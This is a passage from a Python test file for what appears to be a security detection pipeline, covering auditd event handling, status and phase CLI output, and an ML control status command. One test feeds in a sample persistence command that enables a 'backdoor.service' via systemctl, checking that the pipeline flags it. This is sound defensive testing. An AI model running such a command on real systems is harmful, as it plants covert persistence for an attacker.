    pipeline.detection.analyze.assert_called_once()
    assert len(inserted) == 1


def test_auditd_systemctl_persistence_is_not_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="exec",
        process="systemctl",
        raw='type=EXECVE msg=audit(1710000000.000:6): argc=4 a0="systemctl" a1="daemon-reload" a2="&&" a3="systemctl enable backdoor.service"',
        fields={"audit_type": "EXECVE", "cmdline": "systemctl daemon-reload && systemctl enable backdoor.service"},
        message="systemctl daemon-reload && systemctl enable backdoor.service",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_called_once()
    assert len(inserted) == 1


def test_build_operator_phase_manager_uses_db_when_available(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    fake_db = type(
        "_DB",
        (),
        {
            "health_check": staticmethod(lambda: {"ok": True}),
            "_execute": staticmethod(lambda *_args, **_kwargs: {"value": "17"}),
            "close": staticmethod(lambda: None),
        },
    )()
    monkeypatch.setattr(main_module, "create_database", lambda config: fake_db)

    pm, db, db_error = main_module._build_operator_phase_manager({})

    assert db is fake_db
    assert db_error == ""
    assert pm.get_status()["stats"]["total_events"] == 17
    assert pm.get_status()["accounting_mode"] == "db_reconciled"


def test_status_offline_snapshot_fallback_prints_health_and_phase(monkeypatch, tmp_path, capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(main_module, "setup_logging", lambda level: None)
    monkeypatch.setattr(main_module, "load_config", lambda path: {})
    monkeypatch.setattr(main_module, "apply_distro_paths", lambda config, overrides=None: config)
    monkeypatch.setattr(main_module.IntegrationSettings, "load", staticmethod(lambda config_dir="config": type("_I", (), {"log_overrides": {}})()))
    phase_status = {
            "current_phase": 0,
            "phase_name": "Kural Motoru",
            "description": "Rule/Regex/IOC/Threshold",
            "active_layers": {"rules": True},
            "stats": {
                "uptime_days": 0.0,
                "uptime_hours": 0.0,
                "total_events": 9,
                "unique_users": 1,
                "unique_ips": 1,
                "duplicate_count": 2,
                "duplicate_breakdown_by_source": {"auditd": 2},
                "duplicate_breakdown_by_kind": {"exact_same_source": 2},
                "parse_fail_count": 1,
                "parse_fail_breakdown_by_source": {"mail": 1},
                "parse_fail_breakdown_by_reason": {"normalize_none": 1},
            },
            "next_phase": {"next_phase": None, "criteria": []},
            "accounting_mode": "offline_snapshot",
            "accounting_note": "Offline snapshot (phase_state.json)",
    }
    pm = type("_PM", (), {"get_status": staticmethod(lambda: phase_status)})()
    monkeypatch.setattr(main_module, "_build_operator_phase_manager", lambda config: (
        pm,
        None,
        "database_url_missing",
    ))
    monkeypatch.setattr(main_module.sys, "argv", ["main.py", "--status"])

    main_module.main()

    out = capsys.readouterr().out
    summary, _phase_block = out.split("\n\n", 1)
    payload = json.loads(summary)
    assert payload["health"]["status"] == "offline_snapshot"
    assert "Offline snapshot" in out
    assert "Duplicate" in out and "auditd=2" in out and "exact_same_source=2" in out
    assert "Parse fail" in out and "mail=1" in out and "normalize_none=1" in out


def test_phase_and_status_render_same_breakdown_summary(monkeypatch, tmp_path, capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(main_module, "setup_logging", lambda level: None)
    monkeypatch.setattr(main_module, "load_config", lambda path: {})
    monkeypatch.setattr(main_module, "apply_distro_paths", lambda config, overrides=None: config)
    monkeypatch.setattr(main_module.IntegrationSettings, "load", staticmethod(lambda config_dir="config": type("_I", (), {"log_overrides": {}})()))
    phase_status = {
        "current_phase": 0,
        "phase_name": "Kural Motoru",
        "description": "Rule/Regex/IOC/Threshold",
        "active_layers": {"rules": True},
        "stats": {
            "uptime_days": 0.0,
            "uptime_hours": 0.0,
            "total_events": 9,
            "unique_users": 1,
            "unique_ips": 1,
            "duplicate_count": 3,
            "duplicate_breakdown_by_source": {"auditd": 2, "auth.log": 1},
            "duplicate_breakdown_by_kind": {"exact_same_source": 3},
            "parse_fail_count": 2,
            "parse_fail_breakdown_by_source": {"auditd": 2},
            "parse_fail_breakdown_by_reason": {"normalize_none": 2},
        },
        "next_phase": {"next_phase": None, "criteria": []},
        "accounting_mode": "db_reconciled",
        "accounting_note": "DB-reconciled runtime state",
    }
    pm = type("_PM", (), {"get_status": staticmethod(lambda: phase_status)})()
    fake_db = type(
        "_DB",
        (),
        {
            "get_alert_count": staticmethod(lambda hours=1: 0),
            "get_open_incidents": staticmethod(lambda: []),
            "health_check": staticmethod(lambda: {"ok": True, "status": "ok"}),
            "close": staticmethod(lambda: None),
        },
    )()
    monkeypatch.setattr(main_module, "_build_operator_phase_manager", lambda config: (pm, fake_db, ""))

    monkeypatch.setattr(main_module.sys, "argv", ["main.py", "--phase"])
    main_module.main()
    phase_out = capsys.readouterr().out

    monkeypatch.setattr(main_module.sys, "argv", ["main.py", "--status"])
    main_module.main()
    status_out = capsys.readouterr().out

    phase_summary = "\n".join(
        line for line in phase_out.splitlines()
        if "Duplicate  :" in line or "Parse fail :" in line
    )
    status_summary = "\n".join(
        line for line in status_out.splitlines()
        if "Duplicate  :" in line or "Parse fail :" in line
    )

    assert phase_summary == status_summary


def test_ml_status_cli_is_read_only_for_paused_state(monkeypatch, tmp_path, capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(main_module, "setup_logging", lambda level: None)
    monkeypatch.setattr(main_module, "load_config", lambda path: {})
    monkeypatch.setattr(main_module, "apply_distro_paths", lambda config, overrides=None: config)
    monkeypatch.setattr(main_module.IntegrationSettings, "load", staticmethod(lambda config_dir="config": type("_I", (), {"log_overrides": {}})()))

    class _DB:
        def close(self):
            return None

    class _MLCtrl:
        def __init__(self, config, db):
            self.db = db
            self._status = {
                "paused": True,
                "pause_reason": "auto:incident:INC-TEST",
                "paused_at": 100.0,
                "auto_resume": True,
                "clean_window_h": 2.0,
                "excluded_sources": [],
            }

        def status(self):
            return dict(self._status)

        def pause(self, reason="manual"):
            raise AssertionError("ml-status read-only kalmalı")

        def resume(self):
            raise AssertionError("ml-status read-only kalmalı")

        def reset_baseline(self):
            raise AssertionError("ml-status read-only kalmalı")

        @property
        def _db(self):
            return type("_MLDB", (), {"get_ml_control_log": staticmethod(lambda limit=5: [])})()

    monkeypatch.setattr(main_module, "ensure_database", lambda config: _DB())
    monkeypatch.setattr(main_module, "MLController", _MLCtrl)
    monkeypatch.setattr(main_module.sys, "argv", ["main.py", "--ml-status"])

    main_module.main()

    out = capsys.readouterr().out
    assert "ML Kontrol Durumu" in out
    assert "DONDURULMUŞ" in out
